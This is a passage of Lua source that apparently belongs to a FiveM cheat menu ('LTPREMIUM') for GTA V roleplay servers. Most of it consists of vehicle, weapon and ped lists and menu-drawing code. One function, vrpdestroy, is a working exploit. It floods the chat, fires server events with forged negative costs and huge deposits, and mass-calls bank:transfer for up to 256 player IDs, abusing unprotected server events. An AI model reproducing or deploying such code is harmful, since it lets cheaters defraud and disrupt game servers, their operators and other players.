                ['realIndex'] = realSpawnName
            }
        }
    end
    if aD > 0 then
        local aE = -1
        local aG, realSpawnName = aC, aE
        table.insert(
            az,
            1,
            {
                menuName = 'Stock',
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        )
    end
    return az
end

local aH = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aI = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aJ = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}

local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = nil
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
    else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, false)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = nil
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = nil
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end


function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        'xaxaxaxaxaxaxaxaxax',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
                    {
                        costs = -99999999
                    }
                )
                TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
                TriggerServerEvent('Banca:deposit', 999999999)
                TriggerServerEvent('bank:deposit', 999999999)
                local di = GetPlayerServerId(PlayerId())
                for i = 0, 256 do
                    TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
                end
            end
			
local aK = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aL = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aM = {
    'ambulance',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    'police',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
    'Sheriff2'
}
local aN = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aO = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aP = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aQ = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aR = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aS = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aT = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aU = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aV = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aW = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    'taxi',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aX = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'Lynx',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aY = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aZ = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local a_ = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b0 = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local b1 = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local b2 = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local b3 = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local b4 = {
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX,
    aY,
    aZ,
    a_,
    b0,
    b1,
    b2
}
local b5 = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}

local currentMenuX = 1
local selectedMenuX = 1
local currentMenuY = 1
local selectedMenuY = 1
local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
local menuY = { 0.1, 0.025, 0.2, 0.3, 0.425 }

local discordPresence = true



local SelectedPlayer
local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01" }
local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", "a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger", "a_c_shepherd", "a_c_westy" }
local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }

local currentVehicle = 1
local selectedVehicle = 1

local currentVehicleSpeed = 16
local selectedVehicleSpeed = 16

local currentBone = 1
local selectedBone = 1

local currentDamage = 1
local selectedDamage = 1

local currentPed = 1
local selectedPed = 1
local selectedPedd = 1
local currentPedd = 1
local selectedPeddd = 1
local currentPeddd = 1
local selectedPedddd = 1
local currentPedddd = 1

local currentBullet = 1
local selectedBullet = 1

local menus = { }
local Keys = {
  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}
local keys = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

function math.round(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBou328h(frequency)
    local result = {}
    local curtime = GetGameTimer() / 1000

    result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
    result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
    result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

    return result
end

local allWeapons = {
"WEAPON_KNIFE",
"WEAPON_KNUCKLE",
"WEAPON_NIGHTSTICK",
"WEAPON_HAMMER",
"WEAPON_BAT",
"WEAPON_GOLFCLUB",
"WEAPON_CROWBAR",
"WEAPON_BOTTLE",
"WEAPON_DAGGER",
"WEAPON_HATCHET",
"WEAPON_MACHETE",
"WEAPON_FLASHLIGHT",
"WEAPON_SWITCHBLADE",
"WEAPON_PISTOL",
"WEAPON_PISTOL_MK2",
"WEAPON_COMBATPISTOL",
"WEAPON_APPISTOL",
"WEAPON_PISTOL50",
"WEAPON_SNSPISTOL",
"WEAPON_HEAVYPISTOL",
"WEAPON_VINTAGEPISTOL",
"WEAPON_STUNGUN",
"WEAPON_FLAREGUN",
"WEAPON_MARKSMANPISTOL",
"WEAPON_REVOLVER",
"WEAPON_MICROSMG",
"WEAPON_SMG",
"WEAPON_SMG_MK2",
"WEAPON_ASSAULTSMG",
"WEAPON_MG",
"WEAPON_COMBATMG",
"WEAPON_COMBATMG_MK2",
"WEAPON_COMBATPDW",
"WEAPON_GUSENBERG",
"WEAPON_MACHINEPISTOL",
"WEAPON_ASSAULTRIFLE",
"WEAPON_ASSAULTRIFLE_MK2",
"WEAPON_CARBINERIFLE",
"WEAPON_CARBINERIFLE_MK2",
"WEAPON_ADVANCEDRIFLE",
"WEAPON_SPECIALCARBINE",
"WEAPON_BULLPUPRIFLE",
"WEAPON_COMPACTRIFLE",
"WEAPON_PUMPSHOTGUN",
"WEAPON_SAWNOFFSHOTGUN",
"WEAPON_BULLPUPSHOTGUN",
"WEAPON_ASSAULTSHOTGUN",
"WEAPON_MUSKET",
"WEAPON_HEAVYSHOTGUN",
"WEAPON_DBSHOTGUN",
"WEAPON_SNIPERRIFLE",
"WEAPON_HEAVYSNIPER",
"WEAPON_HEAVYSNIPER_MK2",
"WEAPON_MARKSMANRIFLE",
"WEAPON_GRENADELAUNCHER",
"WEAPON_GRENADELAUNCHER_SMOKE",
"WEAPON_RPG",
"WEAPON_STINGER",
"WEAPON_FIREWORK",
"WEAPON_HOMINGLAUNCHER",
"WEAPON_GRENADE",
"WEAPON_STICKYBOMB",
"WEAPON_PROXMINE",
"WEAPON_BZGAS",
"WEAPON_SMOKEGRENADE",
"WEAPON_MOLOTOV",
"WEAPON_FIREEXTINGUISHER",
"WEAPON_PETROLCAN",
"WEAPON_SNOWBALL",
"WEAPON_FLARE",
"WEAPON_BALL",
"WEAPON_MINIGUN"
}

local function debugPrint(text)
    if LTPREMIUM.debug then
        Citizen.Trace("[Plane] "..tostring(text))
    end
end


local function setMenuProperty(id, property, value)
    if id and menus[id] then
        menus[id][property] = value
        debugPrint(id.." menu property changed: { "..tostring(property)..", "..tostring(value).." }")
    end
end

    function LTPREMIUM.SetSpriteColor(id, r, g, b, a)
        setMenuProperty(id, 'spriteColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
    end

local function isMenuVisible(id)
    if id and menus[id] then
        return menus[id].visible
    else
        return false
    end
end

if GetVehiclePedIsUsing(PlayerPedId()) then
    veh = GetVehiclePedIsUsing(PlayerPedId())
end

local bv = false

local bx = GetPlayerServerId(PlayerPedId(-1))
local by = GetPlayerName(bx)

local bl = {
    {
        name = "~h~Spoilers",
        id = 0
    },
    {
        name = "~h~Front Bumper",
        id = 1
    },
    {
        name = "~h~Rear Bumper",
        id = 2
    },
    {
        name = "~h~Side Skirt",
        id = 3
    },
    {
        name = "~h~Exhaust",
        id = 4
    },
    {
        name = "~h~Frame",
        id = 5
    },
    {
        name = "~h~Grille",
        id = 6
    },
    {
        name = "~h~Hood",
        id = 7
    },
    {
        name = "~h~Fender",
        id = 8
    },
    {
        name = "~h~Right Fender",
        id = 9
    },
    {
        name = "~h~Roof",
        id = 10
    },
    {
        name = "~h~Vanity Plates",
        id = 25
    },
    {
        name = "~h~Trim",
        id = 27
    },
    {
        name = "~h~Ornaments",
        id = 28
    },
    {
        name = "~h~Dashboard",
        id = 29
    },
    {
        name = "~h~Dial",
        id = 30
    },
    {
        name = "~h~Door Speaker",
        id = 31
    },
    {
        name = "~h~Seats",
        id = 32
    },
    {
        name = "~h~Steering Wheel",
        id = 33
    },
    {
        name = "~h~Shifter Leavers",
        id = 34
    },
    {
        name = "~h~Plaques",
        id = 35
    },
    {
        name = "~h~Speakers",
        id = 36
    },
    {
        name = "~h~Trunk",
        id = 37
    },
    {
        name = "~h~Hydraulics",
        id = 38
    },
    {
        name = "~h~Engine Block",
        id = 39
    },
    {
        name = "~h~Air Filter",
        id = 40
    },
    {
        name = "~h~Struts",
        id = 41
    },
    {
        name = "~h~Arch Cover",
        id = 42
    },
    {
        name = "~h~Aerials",
        id = 43
    },
    {
        name = "~h~Trim 2",
        id = 44
    },
    {
        name = "~h~Tank",
        id = 45
    },
    {
        name = "~h~Windows",
        id = 46
    },
    {
        name = "~h~Livery",
        id = 48
    },
    {
        name = "~h~Horns",
        id = 14
    },
    {
        name = "~h~Wheels",
        id = 23
    },
    {
        name = "~h~Wheel Types",
        id = "wheeltypes"
    },
    {
        name = "~h~Extras",
        id = "extra"
    },
    {
        name = "~h~Neons",
        id = "neon"
    },
    {
        name = "~h~Paint",
        id = "paint"
    },
    {
        name = "~h~Headlights Color",
        id = "headlight"
    },
    {
        name = "~h~Licence Plate",
        id = "licence"
    }
}


local function setMenuVisible(id, visible, holdCurrent)
    if id and menus[id] then
        setMenuProperty(id, "visible", visible)

        if not holdCurrent and menus[id] then
            setMenuProperty(id, "currentOption", 1)
        end

        if visible then
            if id ~= currentMenu and isMenuVisible(currentMenu) then
                setMenuVisible(currentMenu, false)
            end

            currentMenu = id
        end
    end
end


local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
    SetTextColour(color.r, color.g, color.b, color.a)
    SetTextFont(font)
    SetTextScale(scale, scale)

    if shadow then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end

    if menus[currentMenu] then
        if center then
            SetTextCentre(center)
        elseif alignRight then
            SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
            SetTextRightJustify(true)
        end
    end

    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandDisplayText(x, y)
end


local function drawRect(x, y, width, height, color)
    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end


local function drawTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight / 2

        if menus[currentMenu].titleBackgroundSprite then
            DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
        else
            drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
        end

        drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
    end
end


local function drawSubTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

        local subTitleColor = { r = 255, g = 255, b = 255, a = 0 }

        drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
        drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)

        if optionCount > menus[currentMenu].maxOptionCount then
            drawText(tostring(menus[currentMenu].currentOption).." / "..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
        end
    end
end


local function drawButton(text, subText)
    local x = menus[currentMenu].x + menus[currentMenu].width / 2
    local multiplier = nil

    if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
        multiplier = optionCount
    elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
        multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
        local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
        local backgroundColor = nil
        local textColor = nil
        local subTextColor = nil
        local shadow = false

        if menus[currentMenu].currentOption == optionCount then
            backgroundColor = menus[currentMenu].menuFocusBackgroundColor
            textColor = menus[currentMenu].menuFocusTextColor
            subTextColor = menus[currentMenu].menuFocusTextColor
        else
            backgroundColor = menus[currentMenu].menuBackgroundColor
            textColor = menus[currentMenu].menuTextColor
            subTextColor = menus[currentMenu].menuSubTextColor
            shadow = true
        end

        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

        if subText then
            drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
        end
    end
end


function LTPREMIUM.CreateMenu(id, title)
    menus[id] = { }
    menus[id].title = title

    menus[id].visible = false

    menus[id].previousMenu = nil

    menus[id].aboutToBeClosed = false

    menus[id].x = 0.75
    menus[id].y = 0.1
    menus[id].width = 0.225

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 13

    -- Заглавие на менюто
    menus[id].titleFont = 1
    menus[id].titleColor = { r = 200, g = 200, b = 200, a = 255 } -- Светло сиво
    menus[id].titleBackgroundColor = { r = 50, g = 50, b = 50, a = 200 } -- Тъмно сиво
    menus[id].titleBackgroundSprite = nil

    -- Текст и акценти на менюто
    menus[id].menuTextColor = { r = 180, g = 180, b = 180, a = 255 } -- Светло сиво
    menus[id].menuSubTextColor = { r = 150, g = 150, b = 150, a = 255 } -- Малко по-тъмно сиво
    menus[id].menuFocusTextColor = { r = 220, g = 220, b = 220, a = 255 } -- Почти бяло
